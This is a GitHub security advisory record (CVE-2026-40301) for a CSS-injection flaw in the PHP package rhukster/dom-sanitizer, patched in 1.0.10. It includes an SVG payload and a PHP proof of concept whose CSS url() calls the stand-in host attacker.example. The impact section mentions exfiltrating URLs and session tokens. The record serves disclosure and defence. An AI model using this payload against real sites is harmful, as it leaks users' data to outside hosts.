{"credits": [{"type": "reporter", "user": {"avatar_url": "https://avatars.githubusercontent.com/u/60306789?v=4", "events_url": "https://api.github.com/users/morimori-dev/events{/privacy}", "followers_url": "https://api.github.com/users/morimori-dev/followers", "following_url": "https://api.github.com/users/morimori-dev/following{/other_user}", "gists_url": "https://api.github.com/users/morimori-dev/gists{/gist_id}", "gravatar_id": "", "html_url": "https://github.com/morimori-dev", "id": 60306789, "login": "morimori-dev", "node_id": "MDQ6VXNlcjYwMzA2Nzg5", "organizations_url": "https://api.github.com/users/morimori-dev/orgs", "received_events_url": "https://api.github.com/users/morimori-dev/received_events", "repos_url": "https://api.github.com/users/morimori-dev/repos", "site_admin": false, "starred_url": "https://api.github.com/users/morimori-dev/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/morimori-dev/subscriptions", "type": "User", "url": "https://api.github.com/users/morimori-dev", "user_view_type": "public"}}], "cve_id": "CVE-2026-40301", "cvss": {"score": 4.7, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N"}, "cvss_severities": {"cvss_v3": {"score": 4.7, "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N"}, "cvss_v4": {"score": 0.0, "vector_string": null}}, "cwes": [{"cwe_id": "CWE-79", "name": "Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"}], "description": "### Summary
DOMSanitizer::sanitize() allows <style> elements in SVG content but never inspects their text content. CSS url() references and @import rules pass through unfiltered, causing the browser to issue HTTP requests to attacker-controlled hosts when the sanitized SVG is rendered.

### Details
In src/DOMSanitizer.php, 'style' is listed in the SVG allowed-tag array (line 31). The sanitize() method (lines 111–133) removes disallowed tags and strips attributes matching the EXTERNAL_URL pattern — but text node content of <style> elements is never examined. Because CSS rules live in text nodes, EXTERNAL_URL filtering never applies to them.

Vulnerable code (src/DOMSanitizer.php, line 31):
```php
'svg' => ['style', 'path', 'rect', 'circle', ...],
```

The following payload survives sanitize() intact:
```svg
<svg xmlns="http://www.w3.org/2000/svg">
  <style>* { background: url(https://attacker.example/collect); }</style>
</svg>
```

### PoC
```php
<?php
require 'vendor/autoload.php';
use Rhukster\DomSanitizer\DOMSanitizer;

$svg = '<svg xmlns="http://www.w3.org/2000/svg"><style>* { background: url(https://attacker.example/collect); }</style></svg>';
$sanitizer = new DOMSanitizer(DOMSanitizer::SVG);
$output = $sanitizer->sanitize($svg);
echo $output; // <style> with url() survives unchanged — confirmed exploitable in Statamic CMS (GHSA-g8hv-8w5p-cvqg)
```

Render the returned string in a browser. The browser sends a GET request to https://attacker.example/collect.

### Impact
Any application that passes user-controlled SVG through DOMSanitizer::sanitize() and renders the output in a browser is vulnerable. An attacker can exfiltrate the page URL to an external server, load arbitrary external stylesheets, and on some browsers leverage CSS attribute selectors + url() to exfiltrate cookie or session token values.", "epss": {"percentage": 0.00271, "percentile": 0.18586}, "ghsa_id": "GHSA-93vf-569f-22cq", "github_reviewed_at": "2026-04-10T21:08:30Z", "html_url": "https://github.com/advisories/GHSA-93vf-569f-22cq", "identifiers": [{"type": "GHSA", "value": "GHSA-93vf-569f-22cq"}, {"type": "CVE", "value": "CVE-2026-40301"}], "nvd_published_at": "2026-04-17T21:16:34Z", "published_at": "2026-04-10T21:08:30Z", "references": ["https://github.com/rhukster/dom-sanitizer/security/advisories/GHSA-93vf-569f-22cq", "https://github.com/rhukster/dom-sanitizer/commit/49a98046b708a4c92f754f5b0ef1720bb85142e2", "https://github.com/rhukster/dom-sanitizer/releases/tag/1.0.10", "https://nvd.nist.gov/vuln/detail/CVE-2026-40301", "https://github.com/advisories/GHSA-93vf-569f-22cq"], "repository_advisory_url": "https://api.github.com/repos/rhukster/dom-sanitizer/security-advisories/GHSA-93vf-569f-22cq", "severity": "medium", "source_code_location": "https://github.com/rhukster/dom-sanitizer", "summary": "rhukster/dom-sanitizer: SVG <style> tag allows CSS injection via unfiltered url() and @import directives", "type": "reviewed", "updated_at": "2026-04-24T20:48:45Z", "url": "https://api.github.com/advisories/GHSA-93vf-569f-22cq", "vulnerabilities": [{"first_patched_version": "1.0.10", "package": {"ecosystem": "composer", "name": "rhukster/dom-sanitizer"}, "vulnerable_functions": [], "vulnerable_version_range": "< 1.0.10"}], "withdrawn_at": null}

title: rhukster/dom-sanitizer: SVG <style> tag allows CSS injection via unfiltered url() and @import directives
